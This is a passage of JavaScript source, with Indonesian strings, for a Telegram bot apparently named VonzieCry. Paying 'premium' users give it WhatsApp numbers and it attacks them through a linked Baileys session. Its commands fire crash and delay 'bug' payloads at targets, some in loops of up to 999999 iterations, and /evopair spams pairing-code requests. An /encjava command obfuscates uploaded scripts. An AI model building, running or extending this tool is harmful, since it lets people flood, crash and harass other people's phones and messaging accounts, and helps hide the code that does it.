        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/7pnt5o.jpg", {
      caption: `
<b>
# VonzieCry
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await thexevo(sock, 22, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/vixzc (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/e0oj7s.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await DurationTrick(sock, 22, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   


bot.onText(/\/dostx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/e0oj7s.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await thexevo(sock, 22, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim!");
    
    
 await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber} status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   


const NodeCache = require('node-cache');

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

bot.onText(/\/evopair (\d+)\s*(\d+)?/, async (msg, match) => {
    const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "t.me/BangZyur" }]
      ]
    }
  });
}

    const target = match[1];
    const count = parseInt(match[2]) || 10;
    
    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/e0oj7s.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${target}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });

    try {
        const { state } = await useMultiFileAuthState('VampSystem');
        const { version } = await fetchLatestBaileysVersion();
        const resolveMsgBuffer = new NodeCache();

        const sucked = await makeWASocket({
            printQRInTerminal: false,
            mobile: false,
            auth: state,
            version,
            logger: pino({ level: 'fatal' }),
            resolveMsgBuffer,
            browser: ['Mac Os', 'chrome', '121.0.6167.159']
        });

        for (let i = 0; i < count; i++) {
            await sleep(1600);
            try {
                await sucked.requestPairingCode(target);
            } catch (e) {
                console.error(`Gagal spam pairing ke ${target}:`, e);
            }
        }

        await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${target}
- status : Succes send pairing
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${target}` }]]
      }
    });
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
    }
});

bot.onText(/\/lotional (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/7pnt5o.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await delayUI(22, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim!");
    
    
 await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/downfc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/7pnt5o.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });

      console.log(`🚀 Memulai serangan ke ${jid}`);
      
      await thexevo(sock, 22, jid);
      await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayandro (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/nyjue4.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });

      console.log(`🚀 Memulai serangan ke ${jid}`);
      await thexevo(sock, jid, false); // target = jid (string)
      await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ababbsbs (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/e0oj7s.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });

      console.log(`🚀 Memulai serangan ke ${jid}`);
      await DurationTrick(sock, 22, jid);
      await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/abvdvdbd (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/7pnt5o.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });

      console.log(`🚀 Memulai serangan ke ${jid}`);
      await thexevo(sock, 22, jid);
      await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/snow (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/e0oj7s.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });

      console.log(`🚀 Memulai serangan ke ${formattedNumber}`);
      await thexevo(sock, 22, jid);
      await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/cloodmaltic (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/nyjue4.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });

       for (let i = 0; i < 999999; i++) {
       await thexevo(sock, 22, jid);
                }
                await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xxic (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/nyjue4.jpg", {
      caption: `
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });

       for (let i = 0; i < 999999; i++) {
       await VampBroadcast(sock, jid);
       await xatanicaldelay(sock, jid);
       await protocolbug(sock, jid);
       await protocolbug3(sock, jid);
                }
                await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/invischannel (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@newsletter`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "t.me/BangZyur" }]
      ]
    }
  });
}
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpairing 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/nyjue4.jpg", {
      caption: `
<b>
#VONZIE CRY
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
<b>
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await NewlesterForceClose(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
<b>
# VONZIE CRY
- Target : ${formattedNumber}
- status : Succes send bug🦠
<b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

//=======plugins=======//
bot.onText(/^\/grouponly (on|off)/, (msg, match) => {

    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}

  const mode = match[1] === "on";
  setOnlyGroup(mode);

  bot.sendMessage(
    msg.chat.id,
    `Mode *Only Group* sekarang *${mode ? "AKTIF" : "NONAKTIF"}*`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/encjava/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id.toString();
     
     if (shouldIgnoreMessage(msg)) return;
    // Cek Premium User
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

   
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ *Error:* Balas file .js dengan `/encjava`!", { parse_mode: "Markdown" });
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "❌ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }

    const encryptedPath = path.join(__dirname, `Aphocalyps-encrypted-${file.file_name}`);

    try {
        const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");

        await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

        // **Perbaikan pengambilan file dari Telegram**
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");

        await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

        // Cek apakah file valid sebelum dienkripsi
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");

        // Proses enkripsi menggunakan Aphocalyps Chaos Core
        const obfuscated = await JsConfuser.obfuscate(fileContent, getAphocalypsObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;

        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        // Cek apakah hasil enkripsi valid
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");

        await fs.promises.writeFile(encryptedPath, obfuscatedCode);

        // Kirim file hasil enkripsi
        await bot.sendDocument(chatId, encryptedPath, {
